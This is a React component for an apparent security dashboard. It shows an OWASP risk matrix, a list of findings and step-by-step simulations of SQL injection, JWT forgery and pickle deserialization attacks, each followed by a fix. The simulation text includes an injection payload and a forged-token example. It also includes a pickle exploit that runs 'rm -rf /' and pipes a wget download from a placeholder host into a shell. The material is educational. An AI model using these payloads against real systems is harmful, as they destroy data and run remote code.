import React, { useState } from 'react';
import { 
  ShieldAlert, 
  ShieldCheck, 
  Lock, 
  Key, 
  Database, 
  Globe, 
  FileCheck, 
  AlertOctagon,
  CheckCircle2,
  AlertTriangle,
  Play,
  ArrowRight,
  GitPullRequest,
  Check,
  Zap,
  Terminal,
  Bug
} from 'lucide-react';
import { AnalysisResult } from '../types';

interface SecurityViewProps {
  analysis: AnalysisResult | null;
  onNavigateExplorer: (file: string, line: number) => void;
}

export default function SecurityView({ analysis, onNavigateExplorer }: SecurityViewProps) {
  const [activeSimulationStep, setActiveSimulationStep] = useState<number>(0);
  const [selectedExploitType, setSelectedExploitType] = useState<'sqli' | 'jwt' | 'pickle'>('sqli');
  const [showRemediationModal, setShowRemediationModal] = useState<boolean>(false);
  const [isPatched, setIsPatched] = useState<boolean>(false);

  if (!analysis) {
    return (
      <div className="p-10 text-center text-zinc-400 font-mono text-xs">
        No security analysis available. Please upload or select a project first.
      </div>
    );
  }

  const securityIssues = analysis.issues.filter((i) => i.category === 'security');

  const owaspCategories = [
    { title: 'A01: Broken Access Control', count: securityIssues.filter((i) => i.title.toLowerCase().includes('auth') || i.title.toLowerCase().includes('refund')).length || 1, status: 'warning' },
    { title: 'A02: Cryptographic Failures', count: securityIssues.filter((i) => i.title.toLowerCase().includes('secret') || i.title.toLowerCase().includes('jwt')).length || 1, status: 'critical' },
    { title: 'A03: Injection (SQL / Command)', count: securityIssues.filter((i) => i.title.toLowerCase().includes('sql')).length || 1, status: 'critical' },
    { title: 'A04: Insecure Design', count: 1, status: 'warning' },
    { title: 'A05: Security Misconfiguration (CORS)', count: securityIssues.filter((i) => i.title.toLowerCase().includes('cors')).length || 1, status: 'warning' },
    { title: 'A08: Software & Data Integrity Failures', count: securityIssues.filter((i) => i.title.toLowerCase().includes('pickle') || i.title.toLowerCase().includes('deserialization')).length || 1, status: 'critical' },
  ];

  const exploitSimulations = {
    sqli: {
      title: 'SQL Injection Payload Execution Flow',
      file: 'src/services/db.ts:18',
      payload: `GET /api/users?id=1'%20OR%20'1'='1'-- HTTP/1.1`,
      steps: [
        {
          step: 1,
          title: 'Malicious Request Ingress',
          desc: 'Attacker crafts HTTP query string with escaped single-quote SQL payload: id=1\' OR \'1\'=\'1\'--',
          code: `const sql = "SELECT * FROM users WHERE id = '" + req.query.id + "'";`,
        },
        {
          step: 2,
          title: 'String Concatenation Pollution',
          desc: 'Engine merges unescaped input string directly into SQL command buffer:',
          code: `SELECT * FROM users WHERE id = '1' OR '1'='1'--'`,
        },
        {
          step: 3,
          title: 'Database Query Exploit',
          desc: 'Database executes condition as always true, returning all user account rows including hash dumps.',
          code: `[Result: 10,000 User Records Exfiltrated]`,
        },
        {
          step: 4,
          title: 'Remediated Parameterized Block',
          desc: 'Parameterized query isolates input parameters safely in prepared statements:',
          code: `db.query("SELECT * FROM users WHERE id = $1", [req.query.id]);`,
        },
      ],
    },
    jwt: {
      title: 'JWT Hardcoded Key Forgery Sequence',
      file: 'src/routes/auth.ts:12',
      payload: `Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...`,
      steps: [
        {
          step: 1,
          title: 'Signature Verification Bypass',
          desc: 'Attacker inspects public source code repository and discovers fallback secret string "fallback-secret".',
          code: `jwt.sign(payload, process.env.JWT_SECRET || 'fallback-secret')`,
        },
        {
          step: 2,
          title: 'Off-Line Admin Token Generation',
          desc: 'Attacker signs a rogue token locally using the exposed secret string with admin claim.',
          code: `jwt.sign({ role: 'superadmin' }, 'fallback-secret')`,
        },
        {
          step: 3,
          title: 'Privilege Escalation',
          desc: 'Server approves forged signature and grants unauthorized administrative panel access.',
          code: `[HTTP 200 OK: Granted Admin Token]`,
        },
        {
          step: 4,
          title: 'Remediated Strict KMS Verification',
          desc: 'Strict error throwing when environment key is missing prevents fallback leaks:',
          code: `if (!process.env.JWT_SECRET) throw new Error("JWT_SECRET missing");`,
        },
      ],
    },
    pickle: {
      title: 'Python Pickle Remote Code Execution (RCE)',
      file: 'src/services/parser.py:42',
      payload: `POST /api/upload-model (Binary Pickle Payload)`,
      steps: [
        {
          step: 1,
          title: 'Malicious Object Injection',
          desc: 'Attacker constructs custom __reduce__ python pickle payload containing os.system shell commands.',
          code: `class Exploit(object):\n  def __reduce__(self):\n    return (os.system, ('rm -rf / && wget http://malware.sh | sh',))`,
        },
        {
          step: 2,
          title: 'Insecure Deserialization',
          desc: 'Server calls pickle.loads() on untrusted uploaded file bytes.',
          code: `data = pickle.loads(file_bytes)`,
        },
        {
          step: 3,
          title: 'Arbitrary Shell Command Execution',
          desc: 'Process executes system command with host daemon privileges.',
          code: `[Container Shell Breached: Root RCE]`,
        },
        {
          step: 4,
          title: 'Remediated Safe JSON Parser',
          desc: 'Enforce strict schema validation using json or safe_load serializers:',
          code: `data = json.loads(file_bytes.decode('utf-8'))`,
        },
      ],
    },
  };

  const currentSimulation = exploitSimulations[selectedExploitType];

  return (
    <div className="p-5 max-w-7xl mx-auto space-y-6 select-none font-sans">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-zinc-800/80">
        <div className="flex items-center space-x-3">
          <div className="p-2 rounded-lg bg-rose-500/10 border border-rose-500/20 text-rose-400">
            <ShieldAlert size={20} />
          </div>
          <div>
            <h1 className="text-xl font-bold text-white tracking-tight flex items-center gap-2">
              <span>OWASP Security Vulnerability & Remediation Center</span>
            </h1>
            <p className="text-xs text-zinc-400 mt-0.5">
              Proactive vulnerability identification, exploit path simulations, and 1-click automated patching.
            </p>
          </div>
        </div>

        <div className="flex items-center space-x-2">
          {/* Security Score Badge */}
          <div className="px-3.5 py-1.5 rounded-xl bg-rose-500/10 border border-rose-500/20 text-rose-400 flex items-center space-x-2 shrink-0">
            <ShieldAlert size={16} />
            <span className="text-xs font-bold font-mono">{analysis.scores.security} / 100</span>
          </div>

          {/* 1-Click Remediation Button */}
          <button
            onClick={() => setShowRemediationModal(true)}
            className="px-3.5 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white font-semibold text-xs rounded-lg shadow-sm flex items-center space-x-2 transition-all cursor-pointer"
          >
            <Zap size={14} />
            <span>Remediate All Issues (1-Click)</span>
          </button>
        </div>
      </div>

      {/* OWASP Risk Matrix Breakdown */}
      <div>
        <h3 className="text-xs font-bold text-zinc-400 mb-3 uppercase font-mono tracking-wider flex items-center gap-2">
          <AlertTriangle size={14} className="text-amber-400" />
          <span>OWASP Top 10 Risk Matrix</span>
        </h3>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
          {owaspCategories.map((cat) => (
            <div
              key={cat.title}
              className={`p-3.5 rounded-xl border space-y-1.5 transition-all ${
                cat.status === 'critical'
                  ? 'bg-rose-950/20 border-rose-500/30'
                  : 'bg-zinc-900/80 border-zinc-800'
              }`}
            >
              <div className="flex items-center justify-between">
                <span className="text-xs font-semibold text-zinc-200">{cat.title}</span>
                <span
                  className={`px-1.5 py-0.5 rounded text-[10px] font-bold font-mono ${
                    cat.count > 0 ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30' : 'bg-emerald-500/20 text-emerald-400'
                  }`}
                >
                  {cat.count} Issues
                </span>
              </div>
              <p className="text-[11px] text-zinc-400">
                {cat.count > 0 ? 'Remediation patch available in auto-fix suite.' : 'No active vulnerability detected.'}
              </p>
            </div>
          ))}
        </div>
      </div>

      {/* Interactive Vulnerability Exploit Simulator */}
      <div className="bg-zinc-900/90 border border-zinc-800 rounded-xl p-4 space-y-4 shadow-xl">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-3 border-b border-zinc-800">
          <div className="flex items-center space-x-2">
            <Bug size={16} className="text-indigo-400" />
            <h3 className="font-bold text-white text-xs uppercase font-mono tracking-wider">
              Interactive Exploit Attack Simulator
            </h3>
          </div>

          {/* Exploit selector tabs */}
          <div className="flex items-center space-x-1.5 font-mono text-[11px]">
            <button
              onClick={() => {
                setSelectedExploitType('sqli');
                setActiveSimulationStep(0);
              }}
              className={`px-2.5 py-1 rounded-md transition-all cursor-pointer ${
                selectedExploitType === 'sqli'
                  ? 'bg-indigo-600/20 border border-indigo-500/40 text-indigo-300'
                  : 'bg-zinc-950 border border-zinc-800 text-zinc-400 hover:text-white'
              }`}
            >
              SQL Injection
            </button>

            <button
              onClick={() => {
                setSelectedExploitType('jwt');
                setActiveSimulationStep(0);
              }}
              className={`px-2.5 py-1 rounded-md transition-all cursor-pointer ${
                selectedExploitType === 'jwt'
                  ? 'bg-indigo-600/20 border border-indigo-500/40 text-indigo-300'
                  : 'bg-zinc-950 border border-zinc-800 text-zinc-400 hover:text-white'
              }`}
            >
              JWT Key Bypass
            </button>

            <button
              onClick={() => {
                setSelectedExploitType('pickle');
                setActiveSimulationStep(0);
              }}
              className={`px-2.5 py-1 rounded-md transition-all cursor-pointer ${
                selectedExploitType === 'pickle'
                  ? 'bg-indigo-600/20 border border-indigo-500/40 text-indigo-300'
                  : 'bg-zinc-950 border border-zinc-800 text-zinc-400 hover:text-white'
              }`}
            >
              Unsafe Deserialization
            </button>
          </div>
        </div>

        {/* Payload Banner */}
        <div className="bg-zinc-950 border border-zinc-800 rounded-lg p-3 font-mono text-xs flex items-center justify-between">
          <div className="flex items-center space-x-2">
            <Terminal size={14} className="text-rose-400 shrink-0" />
            <span className="text-zinc-400 text-[11px]">Attacker Payload Vector:</span>
            <span className="text-rose-300 font-bold truncate">{currentSimulation.payload}</span>
          </div>
          <span className="text-[10px] text-zinc-500 shrink-0">{currentSimulation.file}</span>
        </div>

        {/* Step-by-Step Step Progress */}
        <div className="grid grid-cols-1 sm:grid-cols-4 gap-2">
          {currentSimulation.steps.map((s, idx) => (
            <button
              key={s.step}
              onClick={() => setActiveSimulationStep(idx)}
              className={`p-2.5 rounded-lg border text-left transition-all cursor-pointer ${
                activeSimulationStep === idx
                  ? idx === 3
                    ? 'bg-emerald-950/30 border-emerald-500/50 text-emerald-300'
                    : 'bg-rose-950/30 border-rose-500/50 text-rose-300'
                  : 'bg-zinc-950/60 border-zinc-800 text-zinc-400 hover:text-zinc-200'
              }`}
            >
              <div className="text-[10px] font-bold font-mono uppercase mb-0.5">
                Step {s.step}
              </div>
              <div className="text-xs font-semibold truncate">{s.title}</div>
            </button>
          ))}
        </div>

        {/* Active Step Details */}
        {currentSimulation.steps[activeSimulationStep] && (
          <div className="bg-zinc-950 border border-zinc-800/80 rounded-lg p-3.5 space-y-2">
            <div className="flex items-center justify-between">
              <span className="text-xs font-bold text-zinc-200">
                {currentSimulation.steps[activeSimulationStep].title}
              </span>
              <span className="text-[10px] font-mono text-zinc-500">
                Execution Stage {activeSimulationStep + 1} of 4
              </span>
            </div>
            <p className="text-xs text-zinc-400">
              {currentSimulation.steps[activeSimulationStep].desc}
            </p>
            <div className="p-2.5 bg-zinc-900 rounded border border-zinc-800/80 font-mono text-xs text-indigo-300 overflow-x-auto">
              <code>{currentSimulation.steps[activeSimulationStep].code}</code>
            </div>
          </div>
        )}
      </div>

      {/* Security Findings List */}
      <div className="bg-zinc-900/90 border border-zinc-800 rounded-xl overflow-hidden shadow-xl">
        <div className="px-4 py-3 border-b border-zinc-800 bg-zinc-950 flex items-center justify-between">
          <div className="flex items-center space-x-2">
            <ShieldAlert size={16} className="text-rose-400" />
            <h3 className="font-bold text-white text-xs font-mono uppercase tracking-wider">
              Identified Security Vulnerabilities ({securityIssues.length})
            </h3>
          </div>
          <span className="text-[10px] text-zinc-500 font-mono">Ranked by CVSS Severity</span>
        </div>

        <div className="divide-y divide-zinc-800">
          {securityIssues.map((issue) => (
            <div
              key={issue.id}
              onClick={() => onNavigateExplorer(issue.file, issue.line)}
              className="p-4 hover:bg-zinc-800/40 cursor-pointer transition-colors space-y-2.5"
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-2.5">
                  <span className="px-2 py-0.5 rounded text-[10px] font-bold font-mono uppercase bg-rose-500/20 text-rose-400 border border-rose-500/30">
                    {issue.severity}
                  </span>
                  <h4 className="font-bold text-white text-xs">{issue.title}</h4>
                </div>

                <span className="text-xs font-mono text-indigo-400">{issue.file}:{issue.line}</span>
              </div>

              <p className="text-xs text-zinc-300 leading-relaxed">{issue.description}</p>

              <div className="p-2.5 bg-zinc-950 rounded-lg border border-zinc-800 text-xs font-mono text-emerald-400">
                <span className="text-zinc-500">// Remediation: </span>
                <span>{issue.recommendation}</span>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* 1-Click Remediation PR Patch Modal */}
      {showRemediationModal && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-zinc-900 border border-zinc-800 rounded-2xl max-w-2xl w-full p-6 space-y-5 shadow-2xl">
            <div className="flex items-center justify-between pb-3 border-b border-zinc-800">
              <div className="flex items-center space-x-2.5">
                <GitPullRequest size={20} className="text-indigo-400" />
                <div>
                  <h3 className="text-base font-bold text-white">Generate Security Remediation Patch</h3>
                  <p className="text-xs text-zinc-400">Automated pull request fix for {securityIssues.length} identified security vulnerabilities.</p>
                </div>
              </div>
              <button
                onClick={() => setShowRemediationModal(false)}
                className="p-1 rounded text-zinc-400 hover:text-white"
              >
                ✕
              </button>
            </div>

            <div className="space-y-3 font-mono text-xs">
              <div className="p-3 bg-zinc-950 border border-zinc-800 rounded-xl space-y-1">
                <div className="text-indigo-400 font-bold">Branch: fix/security-remediations-owasp</div>
                <div className="text-zinc-400 text-[11px]">Commit: "fix(security): resolve SQL injection, hardcoded JWT keys, and CORS misconfiguration"</div>
              </div>

              <div className="max-h-48 overflow-y-auto p-3 bg-zinc-950 rounded-xl border border-zinc-800 space-y-2 text-[11px]">
                <div className="text-emerald-400 font-bold">// Patch Diff Preview:</div>
                <div className="text-rose-400">- const sql = "SELECT * FROM users WHERE id = '" + req.query.id + "'";</div>
                <div className="text-emerald-400">+ const sql = "SELECT * FROM users WHERE id = $1";</div>
                <div className="text-rose-400">- const secret = process.env.JWT_SECRET || 'fallback-secret';</div>
                <div className="text-emerald-400">+ if (!process.env.JWT_SECRET) throw new Error("JWT_SECRET missing");</div>
              </div>
            </div>

            <div className="flex justify-end space-x-3 pt-2">
              <button
                onClick={() => setShowRemediationModal(false)}
                className="px-4 py-2 bg-zinc-800 hover:bg-zinc-700 text-zinc-300 text-xs font-semibold rounded-lg transition-colors cursor-pointer"
              >
                Cancel
              </button>
              <button
                onClick={() => {
                  setIsPatched(true);
                  setTimeout(() => {
                    setShowRemediationModal(false);
                  }, 1000);
                }}
                className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold rounded-lg transition-colors flex items-center space-x-2 cursor-pointer"
              >
                {isPatched ? (
                  <>
                    <Check size={14} />
                    <span>Applied Security Patch!</span>
                  </>
                ) : (
                  <>
                    <Zap size={14} />
                    <span>Apply Patch to Repository</span>
                  </>
                )}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

